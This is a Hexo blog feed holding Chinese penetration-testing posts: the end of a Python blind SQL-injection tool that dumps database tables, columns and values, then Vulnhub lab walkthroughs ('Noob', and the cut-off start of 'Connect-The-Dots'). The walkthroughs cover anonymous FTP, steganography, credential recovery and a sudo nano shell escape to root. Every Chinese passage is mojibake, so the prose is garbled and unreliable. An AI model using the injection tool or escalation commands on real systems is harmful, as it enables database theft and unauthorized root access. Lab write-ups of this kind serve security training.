 User_table_name = input(&#x27;è¯·è¾“å…¥è¦æŸ¥çœ‹çš„è¡¨åï¼ˆexité€€å‡ºï¼‰ï¼š&#x27;)</span><br><span class="line">        if User_table_name == &#x27;exit&#x27;:</span><br><span class="line">            break</span><br><span class="line">        # ï¼ˆ4ï¼‰å¼€å§‹æŸ¥è¯¢æ•°æ®åº“è¡¨å­—æ®µ</span><br><span class="line">        print(&#x27;\033[93m---------------------------- åº“è¡¨å­—æ®µæŸ¥è¯¢ä¸­ ------------------------------\033[0m&#x27;)</span><br><span class="line">        threading_status = True     # å¯åŠ¨å‰¯çº¿ç¨‹</span><br><span class="line">        column_names = column_name(column_length(User_table_name),User_table_name)       #æ±‚å­—æ®µçš„åå­—ï¼Œè¾“å…¥å­—æ®µçš„é•¿åº¦</span><br><span class="line">        threading_status = False    #å…³é—­å‰¯çº¿ç¨‹</span><br><span class="line">        if len(column_names) == 0:</span><br><span class="line">            print(&quot;\n\033[91m[-]\033[0m æŸ¥è¯¢å¤±è´¥ï¼Œè¯·è°ƒæ•´\033[91mcolumn_lengthå‡½æ•°ä¸­å¯¹æ•°å€¼çˆ†ç ´çš„é•¿åº¦å€¼ï¼Œæˆ–æ£€æŸ¥ä½¿ç”¨çš„payload\033[0m&quot;)</span><br><span class="line">            kill()</span><br><span class="line">        while True:             #è¿™é‡Œåšæ— é™å¾ªç¯ï¼Œæ–¹ä¾¿æŸ¥è¯¢è¡¨çš„æ‰€æœ‰å­—æ®µå€¼</span><br><span class="line">            print(&#x27;\n\033[93m---------------------------- é€‰æ‹©æŸ¥è¯¢å­—æ®µå ------------------------------\033[0m&#x27;)</span><br><span class="line">            print(f&quot;\033[92m[+]\033[0m &#123;User_table_name&#125;è¡¨æ‰€æœ‰\033[96må­—æ®µå\033[0mä¸ºï¼š\033[94m&#123;column_names&#125;\033[0m&quot;)</span><br><span class="line">            User_column_name = input(&#x27;è¯·è¾“å…¥è¦æŸ¥çœ‹çš„å­—æ®µåï¼ˆexité€€å‡ºï¼‰ï¼š&#x27;)</span><br><span class="line">            if User_column_name == &#x27;exit&#x27;:</span><br><span class="line">                break</span><br><span class="line">            # ï¼ˆ5ï¼‰å¼€å§‹æŸ¥è¯¢æ•°æ®åº“è¡¨å­—æ®µçš„æ•°æ®å€¼</span><br><span class="line">            print(&#x27;\033[93m---------------------------- å­—æ®µæ•°æ®æŸ¥è¯¢ä¸­ ------------------------------\033[0m&#x27;)</span><br><span class="line">            threading_status = True     # å¯åŠ¨å‰¯çº¿ç¨‹</span><br><span class="line">            column_data_len = column_data_length(User_table_name,User_column_name)   #æ±‚å­—æ®µå€¼çš„é•¿åº¦ï¼Œä¼ å…¥å­—æ®µçš„åç§°</span><br><span class="line">            column_data_names = column_data_name(column_data_len,User_table_name,User_column_name)  #æ±‚å­—æ®µçš„å€¼</span><br><span class="line">            threading_status = False    #å…³é—­å‰¯çº¿ç¨‹</span><br><span class="line">            print(&#x27;\n\033[92m---------------------------- å­—æ®µæ•°æ®æŸ¥è¯¢ç»“æŸ ------------------------------\033[0m&#x27;)</span><br><span class="line">            if len(column_data_names) == 0:</span><br><span class="line">                print(&quot;\033[91m[-]\033[0m æŸ¥è¯¢å¤±è´¥ï¼Œè¯·è°ƒæ•´\033[91mcolumn_data_lengthå‡½æ•°ä¸­å¯¹æ•°å€¼çˆ†ç ´çš„é•¿åº¦å€¼ï¼Œæˆ–æ£€æŸ¥ä½¿ç”¨çš„payload\033[0m&quot;)</span><br><span class="line">                print(&quot;\033[91m[-]\033[0m æŸ¥è¯¢å¤±è´¥ã€‚å¦‚æœå¢å¤§æŸ¥è¯¢åŠ›åº¦ä»ä¸å¯ç”¨ï¼Œåˆ™æ­¤å¤„å¯èƒ½æ˜¯ä¸€å¼ ç©ºè¡¨ï¼Œå¯æ›´æ¢å…¶ä»–è¡¨æˆ–å­—æ®µæŸ¥çœ‹&quot;)</span><br><span class="line">                kill()</span><br><span class="line">            print(f&quot;\033[92m[+]\033[0m &#123;User_column_name&#125;å­—æ®µæ‰€æœ‰\033[96mæ•°å€¼\033[0mä¸ºï¼š\033[94m&#123;column_data_names&#125;\033[0m&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    try:</span><br><span class="line">        main()  #æ‰§è¡Œä¸»çº¿ç¨‹</span><br><span class="line">        kill()  #æ‰§è¡Œå¤„ç†å‡½æ•°</span><br><span class="line">    except Exception:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure><h1 id="äº”ã€ç»“è¯­"><a href="#äº”ã€ç»“è¯­" class="headerlink" title="äº”ã€ç»“è¯­"></a>äº”ã€ç»“è¯­</h1><p>æ­¤ä¸ºå°èœçš„è‡ªåˆ¶è„šæœ¬ï¼Œå¤§ä½¬å‹¿å–·ï¼Œå¦‚æœ‰ä¸å¦¥ä¹‹å¤„è¿˜è¯·è”ç³»æŒ‡æ­£å­¦ä¹ ã€‚</p><p>æ­¤è„šæœ¬ä»…ä¾›å­¦ä¹ å‚è€ƒä½¿ç”¨ï¼Œæœªåœ¨æˆæƒæƒ…å†µä¸‹å¯¹å…¶ä»–è®¡ç®—æœºé€ æˆçš„æŸå¤±å‡ç”±ä½¿ç”¨äººæ‰¿æ‹…ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Pythonæ­¦å™¨åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pythonæ­¦å™¨åº“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Vulnhubç³»åˆ—ã€‘Vulnhubé¶åœºâ€”Noob</title>
      <link href="/2024/03/29/Vulnhub-Noob/"/>
      <url>/2024/03/29/Vulnhub-Noob/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub-Noobé¶åœºæ¸—é€"><a href="#ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub-Noobé¶åœºæ¸—é€" class="headerlink" title="ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub Noobé¶åœºæ¸—é€"></a>ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub Noobé¶åœºæ¸—é€</h1><h1 id="ä¸€ã€ä¸»æœºå‘ç°"><a href="#ä¸€ã€ä¸»æœºå‘ç°" class="headerlink" title="ä¸€ã€ä¸»æœºå‘ç°"></a>ä¸€ã€ä¸»æœºå‘ç°</h1><p><img src="/img/Vulnhub-Noob/image-20240329123501318.png" alt="image-20240329123501318"></p><h1 id="äºŒã€ç«¯å£æ‰«æ"><a href="#äºŒã€ç«¯å£æ‰«æ" class="headerlink" title="äºŒã€ç«¯å£æ‰«æ"></a>äºŒã€ç«¯å£æ‰«æ</h1><p><img src="/img/Vulnhub-Noob/image-20240329123534496.png" alt="image-20240329123534496"></p><p><img src="/img/Vulnhub-Noob/image-20240329123821191.png" alt="image-20240329123821191"></p><p><img src="/img/Vulnhub-Noob/image-20240329125303259.png" alt="image-20240329125303259"></p><p>æœ‰ä¸€ä¸ª<code>go.php</code>çš„formè¡¨å•æ¥æ”¶æ–‡ä»¶</p><p><img src="/img/Vulnhub-Noob/image-20240329151526498.png" alt="image-20240329151526498"></p><p>è¿™é‡Œè¯†åˆ«21ç«¯å£å­˜åœ¨æœªæˆæƒï¼Œ55077 æ˜¯ssh çš„æœåŠ¡ç«¯å£</p><h1 id="ä¸‰ã€webæ¸—é€"><a href="#ä¸‰ã€webæ¸—é€" class="headerlink" title="ä¸‰ã€webæ¸—é€"></a>ä¸‰ã€webæ¸—é€</h1><h2 id="1ã€webä¿¡æ¯æ”¶é›†"><a href="#1ã€webä¿¡æ¯æ”¶é›†" class="headerlink" title="1ã€webä¿¡æ¯æ”¶é›†"></a>1ã€webä¿¡æ¯æ”¶é›†</h2><p>é¦–é¡µæ˜¯ä¸€ä¸ªç™»é™†ç•Œé¢</p><p><img src="/img/Vulnhub-Noob/image-20240329125547353.png" alt="image-20240329125547353"></p><p>æ‰«æä¸€ä¸‹è·¯å¾„ï¼Œçœ‹æ¥é‡ç‚¹æ˜¯è¿™ä¸ªç™»é™†é¡µé¢</p><p><img src="/img/Vulnhub-Noob/image-20240329133333186.png" alt="image-20240329133333186"></p><p>çœ‹ä¸€ä¸‹é¡µé¢æºä»£ç </p><p><img src="/img/Vulnhub-Noob/image-20240329133422245.png" alt="image-20240329133422245"></p><p>è¿™æ®µjsä»£ç å¾ˆæœ‰æ„æ€ï¼Œæ€»ä½“æ¥è¯´ï¼Œæ˜¯é˜²æ­¢ç”¨æˆ·ä½¿ç”¨ç‰¹å®šçš„é”®ç›˜å¿«æ·é”®å’Œé¼ æ ‡æ“ä½œï¼Œå¦‚å¤åˆ¶ã€æ’¤é”€ã€å³é”®èœå•å’Œä¸Šä¸‹æ–‡èœå•ã€‚è¿™å¯ä»¥ç”¨äºä¿æŠ¤ç½‘é¡µå†…å®¹ï¼Œé˜²æ­¢ç”¨æˆ·è¿›è¡ŒæŸäº›å¯èƒ½ä¸å¸Œæœ›çš„æ“ä½œã€‚</p><p>æ„Ÿè§‰æš‚æ—¶æ²¡ä»€ä¹ˆç”¨</p><p>é’ˆå¯¹ç™»é™†è¡¨å•å°è¯•sqlæ³¨å…¥ï¼Œæ³¨å…¥å¤±è´¥å•Š</p><p><img src="/img/Vulnhub-Noob/image-20240329134641028.png" alt="image-20240329134641028"></p><h2 id="2ã€ftp-æœªæˆæƒè®¿é—®"><a href="#2ã€ftp-æœªæˆæƒè®¿é—®" class="headerlink" title="2ã€ftp æœªæˆæƒè®¿é—®"></a>2ã€ftp æœªæˆæƒè®¿é—®</h2><p>å°è¯•ç©ºå¯†ç ç™»é™†ftpï¼ŒæˆåŠŸ</p><p><img src="/img/Vulnhub-Noob/image-20240329134630921.png" alt="image-20240329134630921"></p><p>å°†ä¸¤ä¸ªæ–‡ä»¶ä¸‹è½½ä¸‹æ¥</p><p><img src="/img/Vulnhub-Noob/image-20240329135118204.png" alt="image-20240329135118204"></p><p><code>cred.txt</code>æ–‡ä»¶è§£å¯†ï¼Œæ‹¿åˆ°ä¸€ç»„è´¦å·å¯†ç </p><p><img src="/img/Vulnhub-Noob/image-20240329135252491.png" alt="image-20240329135252491"></p><p>åœ¨æ–‡æ¡£ç¼–è¾‘å™¨ä¸­æ‰“å¼€<code>welcome</code>æ–‡ä»¶</p><p><img src="/img/Vulnhub-Noob/image-20240329135313642.png" alt="image-20240329135313642"></p><h2 id="3ã€webå…¥ä¾µ"><a href="#3ã€webå…¥ä¾µ" class="headerlink" title="3ã€webå…¥ä¾µ"></a>3ã€webå…¥ä¾µ</h2><p>ç”¨æ‹¿åˆ°çš„è´¦å·å¯†ç ç™»é™†webé¦–é¡µï¼ŒæˆåŠŸç™»é™†</p><p><img src="/img/Vulnhub-Noob/image-20240329135502281.png" alt="image-20240329135502281"></p><p>æƒ³æŸ¥çœ‹é¡µé¢æºä»£ç ï¼Œå‘ç°å³å‡»å¤±æ•ˆï¼Œåº”è¯¥ä¸Šé¢é‡åˆ°çš„js çš„åŸå› ï¼Œè¿™ä¸ªå¾ˆå¥½ç»•è¿‡ï¼Œåœ¨url è¿æ¥å‰æ–¹æ·»åŠ å¦‚ä¸‹å³å¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Noob/image-20240329135740726.png" alt="image-20240329135740726"></p><p>è¿™é‡Œï¼Œå­˜åœ¨ä¸€ä¸ª<code>.rar</code>çš„å‹ç¼©åŒ…ï¼Œ</p><p><img src="/img/Vulnhub-Noob/image-20240329140536932.png" alt="image-20240329140536932"></p><p>ä¸‹è½½è§£å‹</p><p><img src="/img/Vulnhub-Noob/image-20240329140632291.png" alt="image-20240329140632291"></p><p>æå–å…¶ä¸­çš„æ–‡å­—</p><p><img src="/img/Vulnhub-Noob/image-20240329141034651.png" alt="image-20240329141034651"></p><p>æœ‰è¶£çš„æ–‡ä»¶åï¼Ÿsudoï¼Œç¡®å®æ˜¯ä¸€ä¸ªå¾ˆæœ‰è¶£çš„æ–‡ä»¶åï¼Œä½†æ˜¯å®ƒä¸èƒ½ç»™æˆ‘ä»¬æ›´å¤šçš„å¸®åŠ©</p><p>æ—¢ç„¶èƒ½ä¸‹è½½æ–‡ä»¶ï¼Œæ˜¯å¦å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸‹è½½ï¼Ÿé—æ†¾çš„æ˜¯å¹¶ä¸å­˜åœ¨</p><p>å°†åå°çš„ç…§ç‰‡ä¸‹è½½ä¸‹æ¥ï¼ŒæŸ¥çœ‹æ˜¯å¦å­˜åœ¨éšå†™</p><p><img src="/img/Vulnhub-Noob/image-20240329150952649.png" alt="image-20240329150952649"></p><p>å­˜åœ¨Zlib æ•°æ®ï¼Œä½¿ç”¨<code>dd</code>å‘½ä»¤è¿›è¡Œæå–</p><p><img src="/img/Vulnhub-Noob/image-20240329151025639.png" alt="image-20240329151025639"></p><p><img src="/img/Vulnhub-Noob/image-20240329151223463.png" alt="image-20240329151223463"></p><p>æ‹¿åˆ°ä¸€ä¸ªå¯†ç <code>blehguessme090</code>ï¼Œå·®ä¸ªç”¨æˆ·å</p><h2 id="4ã€è·å–shellç«‹è¶³ç‚¹"><a href="#4ã€è·å–shellç«‹è¶³ç‚¹" class="headerlink" title="4ã€è·å–shellç«‹è¶³ç‚¹"></a>4ã€è·å–shellç«‹è¶³ç‚¹</h2><p>è¿™ä¸ªç”¨æˆ·åæˆ‘å°è¯•äº†å¤šç§æ–¹æ³•ï¼Œæ‰¾æ•æ„Ÿå•è¯ç­‰ï¼Œä»¥åŠçˆ†ç ´çš„æ–¹å¼éƒ½å°è¯•è¿‡äº†ï¼Œå‡å¤±è´¥</p><p>é‚£ä¹ˆï¼Œå›è¿‡å¤´æ¥æŸ¥çœ‹æ‰‹é‡Œçš„çº¿ç´¢ï¼Œå¯ç–‘çš„ç‚¹åœç•™åœ¨äº†webä¸‹è½½çš„<code>.rar</code>æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶ä¸­å­˜åœ¨ä¸¤å¼ ä¸€æ¨¡ä¸€æ ·çš„å›¾ç‰‡ï¼Œä¸€ä¸ªæ˜¯<code>.jpg</code>æ–‡ä»¶ï¼Œä¸€ä¸ªæ˜¯<code>.bmp</code>æ–‡ä»¶</p><p><img src="/img/Vulnhub-Noob/image-20240329160516399.png" alt="image-20240329160516399"></p><p>æ¯”å¯¹è¿™ä¸¤å¼ å›¾ç‰‡</p><p><img src="/img/Vulnhub-Noob/image-20240329160623811.png" alt="image-20240329160623811"></p><p>çœ‹æ¥è¿˜æ˜¯æœ‰å·®å¼‚çš„</p><p>æŸ¥çœ‹æœ‰æ— éšå†™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide info funny.jpg</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Noob/image-20240329162858078.png" alt="image-20240329162858078"></p><p>ä¸¤ä¸ªæ–‡ä»¶éƒ½å­˜åœ¨éšå†™ï¼Œ<code>.bmp</code>æ–‡ä»¶éœ€è¦æ­£ç¡®çš„å¯†ç ï¼Œè€Œ<code>.jpg</code>æ— å¯†ç ï¼Œæå–å‡ºæ¥çœ‹ä¸€ä¸‹</p><p><img src="/img/Vulnhub-Noob/image-20240329163028558.png" alt="image-20240329163028558"></p><p>æç¤ºæˆ‘ä»¬è¿›è¡Œæ—‹è½¬ï¼Œæå–å¦ä¸€ä¸ªæ–‡ä»¶ï¼Œç”¨<code>sudo</code>è¿™ä¸ªå¯†ç </p><p><img src="/img/Vulnhub-Noob/image-20240329163218941.png" alt="image-20240329163218941"></p><p>å¯¹è¿™ä¸ªå†…å®¹è¿›è¡ŒRot13è§£å¯†</p><p><img src="/img/Vulnhub-Noob/image-20240329165745279.png" alt="image-20240329165745279"></p><p>ç»™äº†ä¸€ä¸ª<code>wtf</code>ï¼Œè¯•è¯•sshç™»é™†</p><p><img src="/img/Vulnhub-Noob/image-20240329170404273.png" alt="image-20240329170404273"></p><p>æˆåŠŸç™»é™†è¿›æ¥</p><h1 id="å››ã€ææƒroot"><a href="#å››ã€ææƒroot" class="headerlink" title="å››ã€ææƒroot"></a>å››ã€ææƒroot</h1><h2 id="1ã€ç¿»æ‰¾æ•æ„Ÿæ–‡ä»¶"><a href="#1ã€ç¿»æ‰¾æ•æ„Ÿæ–‡ä»¶" class="headerlink" title="1ã€ç¿»æ‰¾æ•æ„Ÿæ–‡ä»¶"></a>1ã€ç¿»æ‰¾æ•æ„Ÿæ–‡ä»¶</h2><p>çœ‹å½“å‰ç”¨æˆ·çš„å†å²è®°å½•</p><p><img src="/img/Vulnhub-Noob/image-20240329172307494.png" alt="image-20240329172307494"></p><p>å‘ç°å‡ ä¸ªæ•æ„Ÿæ–‡ä»¶<img src="/img/Vulnhub-Noob/image-20240329172446376.png" alt="image-20240329172446376"></p><p>æ˜‚ï¼Œè¿™é‡Œï¼Œæœ‰æ·»åŠ ç”¨æˆ·çš„æƒé™å—<img src="/img/Vulnhub-Noob/image-20240329172605026.png" alt="image-20240329172605026"></p><p>è¿™é‡Œæœ‰ä¸€ä¸ªflag<img src="/img/Vulnhub-Noob/image-20240329172624538.png" alt="image-20240329172624538"></p><h2 id="2ã€ææƒè‡³n00b"><a href="#2ã€ææƒè‡³n00b" class="headerlink" title="2ã€ææƒè‡³n00b"></a>2ã€ææƒè‡³n00b</h2><p>æŒ¨ç€çœ‹ä¸€ä¸‹è¿™äº›æ•æ„Ÿæ–‡ä»¶å‘ç°n00b çš„è´¦å·å’Œå¯†ç ï¼š<code>n00b:aw3s0m3p@$$w0rd</code><img src="/img/Vulnhub-Noob/image-20240329172926878.png" alt="image-20240329172926878"></p><p>ç™»é™†ä¸€ä¸‹<img src="/img/Vulnhub-Noob/image-20240329173131796.png" alt="image-20240329173131796"></p><p>ç™»é™†æˆåŠŸï¼Œä¾ç„¶ï¼Œç¿»çœ‹ä¸€ä¸‹å†å²å‘½ä»¤æ–‡ä»¶<img src="/img/Vulnhub-Noob/image-20240329173323690.png" alt="image-20240329173323690"></p><p>åœ¨<code>/home/rooot</code>ç›®å½•ä¸‹æœ‰ä¸ªflag<img src="/img/Vulnhub-Noob/image-20240329173454121.png" alt="image-20240329173454121"></p><p>åªé¢†å…ˆä¸¤æ­¥ï¼Ÿå¥½åƒæ˜¯ä¸€ä¸ªæ²¡å•¥ç”¨çš„æç¤º</p><h2 id="3ã€ææƒè‡³root"><a href="#3ã€ææƒè‡³root" class="headerlink" title="3ã€ææƒè‡³root"></a>3ã€ææƒè‡³root</h2><p>å‘ç°å¯ä»¥å…å¯†ç ç”¨rootæƒé™ä½¿ç”¨<code>nano</code>å‘½ä»¤ï¼Œè¿™ä¸ªå¥½æ¶ˆæ¯å¤ªé‡è¦äº†</p><p><img src="/img/Vulnhub-Noob/image-20240329174100117.png" alt="image-20240329174100117"></p><p>ä½¿ç”¨å¦‚ä¸‹ææƒè‡³root</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo nano</span><br><span class="line">^R^X</span><br><span class="line">reset; sh 1&gt;&amp;0 2&gt;&amp;0</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Noob/image-20240329174250964.png" alt="image-20240329174250964"></p><p>è¿™é‡Œè¿˜å¯ä»¥åšåå¼¹shellï¼Œä½¿æ“ä½œæ›´åŠ èˆ’ç•…</p>]]></content>
      
      
      <categories>
          
          <category> Vulnhubç³»åˆ—é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Vulnhubç³»åˆ—ã€‘Vulnhub_Connect-The-Dots</title>
      <link href="/2024/03/26/Vulnhub-Connect-The-Dots/"/>
      <url>/2024/03/26/Vulnhub-Connect-The-Dots/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub-Connect-The-Dotsé¶åœºæ¸—é€"><a href="#ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub-Connect-The-Dotsé¶åœºæ¸—é€" class="headerlink" title="ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub Connect-The-Dotsé¶åœºæ¸—é€"></a>ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub Connect-The-Dotsé¶åœºæ¸—é€</h1><h1 id="ä¸€ã€ä¸»æœºå‘ç°"><a href="#ä¸€ã€ä¸»æœºå‘ç°" class="headerlink" title="ä¸€ã€ä¸»æœºå‘ç°"></a>ä¸€ã€ä¸»æœºå‘ç°</h1><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326194456246.png" alt="image-20240326194456246"></p><h1 id="äºŒã€ç«¯å£æ‰«æ"><a href="#äºŒã€ç«¯å£æ‰«æ" class="headerlink" title="äºŒã€ç«¯å£æ‰«æ"></a>äºŒã€ç«¯å£æ‰«æ</h1><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326194528129.png" alt="image-20240326194528129"></p><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326195354306.png" alt="image-20240326195354306"></p><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326195725031.png" alt="image-20240326195725031"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE  VERSION</span><br><span class="line">21/tcp    open  ftp      vsftpd 2.0.8 or later</span><br><span class="line">80/tcp    open  http     Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Landing Page</span><br><span class="line">111/tcp   open  rpcbind  2-4 (RPC #100000)</span><br><span class="line">| rpcinfo:</span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100003  3           2049/udp   nfs</span><br><span class="line">|   100003  3           2049/udp6  nfs</span><br><span class="line">|   100003  3,4         2049/tcp   nfs</span><br><span class="line">|   100003  3,4         2049/tcp6  nfs</span><br><span class="line">|   100005  1,2,3      36491/tcp6  mountd</span><br><span class="line">|   100005  1,2,3      39219/udp   mountd</span><br><span class="line">|   100005  1,2,3      57615/tcp   mountd</span><br><span class="line">|   100005  1,2,3      60794/udp6  mountd</span><br><span class="line">|   100021  1,3,4      34413/tcp   nlockmgr</span><br><span class="line">|   100021  1,3,4      40025/tcp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      41099/udp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      49864/udp   nlockmgr</span><br><span class="line">|   100227  3           2049/tcp   nfs_acl</span><br><span class="line">|   100227  3           2049/tcp6  nfs_acl</span><br><span class="line">|   100227  3           2049/udp   nfs_acl</span><br><span class="line">|_  100227  3           2049/udp6  nfs_acl</span><br><span class="line">2049/tcp  open  nfs      3-4 (RPC #100003)</span><br><span class="line">7822/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 38:4f:e8:76:b4:b7:04:65:09:76:dd:23:4e:b5:69:ed (RSA)</span><br><span class="line">|   256 ac:d2:a6:0f:4b:41:77:df:06:f0:11:d5:92:39:9f:eb (ECDSA)</span><br><span class="line">|_  256 93:f7:78:6f:cc:e8:d4:8d:75:4b:c2:bc:13:4b:f0:dd (ED25519)</span><br><span class="line">34413/tcp open  nlockmgr 1-4 (RPC #100021)</span><br><span class="line">38351/tcp open  mountd   1-3 (RPC #100005)</span><br><span class="line">57615/tcp open  mountd   1-3 (RPC #100005)</span><br><span class="line">58867/tcp open  mountd   1-3 (RPC #100005)</span><br><span class="line">MAC Address: 00:0C:29:E9:55:60 (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><p>ssh æœåŠ¡å¼€æ”¾åœ¨7822ç«¯å£</p><h1 id="ä¸‰ã€webæ¸—é€"><a href="#ä¸‰ã€webæ¸—é€" class="headerlink" title="ä¸‰ã€webæ¸—é€"></a>ä¸‰ã€webæ¸—é€</h1><h2 id="1ã€ä¿¡æ¯æ”¶é›†"><a href="#1ã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="1ã€ä¿¡æ¯æ”¶é›†"></a>1ã€ä¿¡æ¯æ”¶é›†</h2><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326195236335.png" alt="image-20240326195236335"></p><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326201055942.png" alt="image-20240326201055942"></p><p>åœ¨nmap è¿›è¡Œæ¼æ´æ¢æµ‹çš„æ—¶å€™å‘ç°å­˜åœ¨è¦ç»™mysite æ–‡ä»¶å¤¹</p><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326205256561.png" alt="image-20240326205256561"></p><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326201303086.png" alt="image-20240326201303086"></p><p>ä¸€ä¸ªè¢«åŠ å¯†è¿‡çš„js</p><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326203944010.png" alt="image-20240326203944010"></p><p>ä¸€ä¸ªé™æ€çš„ç™»é™†é¡µ</p><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326201410832.png" alt="image-20240326201410832"></p><p>çœ‹æºä»£ç å‘ç°åŠ è½½äº†åŠ å¯†è¿‡çš„js</p><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326204116393.png" alt="image-20240326204116393"></p><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326204212584.png" alt="image-20240326204212584"></p><h2 id="2ã€è·å–shell"><a href="#2ã€è·å–shell" class="headerlink" title="2ã€è·å–shell"></a>2ã€è·å–shell</h2><p>æˆ‘ä»¬æŠŠæ‰€æœ‰b1åŠ å¯†åçš„å­—ç¬¦ä¸²åŠ èµ·æ¥è¾“å‡º</p><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326205037216.png" alt="image-20240326205037216"></p><p>ä¹‹åè¿›è¡Œjs Fuck çš„è§£å¯†</p><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326205007264.png" alt="image-20240326205007264"></p><p>æ‹¿åˆ°ä¸€ä¸ª<code>TryToGuessThisNorris@2k19</code>çš„å¯†ç </p><p>å°è¯•ssh ç™»é™†</p><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326205848716.png" alt="image-20240326205848716"></p><h1 id="å››ã€ææƒmorris"><a href="#å››ã€ææƒmorris" class="headerlink" title="å››ã€ææƒmorris"></a>å››ã€ææƒmorris</h1><h2 id="1ã€ä¿¡æ¯æ”¶é›†-1"><a href="#1ã€ä¿¡æ¯æ”¶é›†-1" class="headerlink" title="1ã€ä¿¡æ¯æ”¶é›†"></a>1ã€ä¿¡æ¯æ”¶é›†</h2><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326210042414.png" alt="image-20240326210042414"></p><p><code>game.jpg.bak</code>æ–‡ä»¶å­˜åœ¨æ‘©æ–¯å¯†ç </p><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326210407277.png" alt="image-20240326210407277"></p><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326210554979.png" alt="image-20240326210554979"></p><p>ç”¨æ‘©æ–¯å¯†ç è§£å¯†ç½‘ç«™ï¼Œè¯´æœ‰ä¸€ä¸ª<code>SECRETFILE</code>çš„æ–‡ä»¶</p><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326210801616.png" alt="image-20240326210801616"></p><p>åœ¨<code>/var/www/html</code>ç›®å½•ä¸‹æ‰¾åˆ°</p><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326210939211.png" alt="image-20240326210939211"></p><p>é€šè¿‡æµè§ˆå™¨ä¸‹è½½<code>.swp</code>æ–‡ä»¶</p><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326211750493.png" alt="image-20240326211750493"></p><p><img 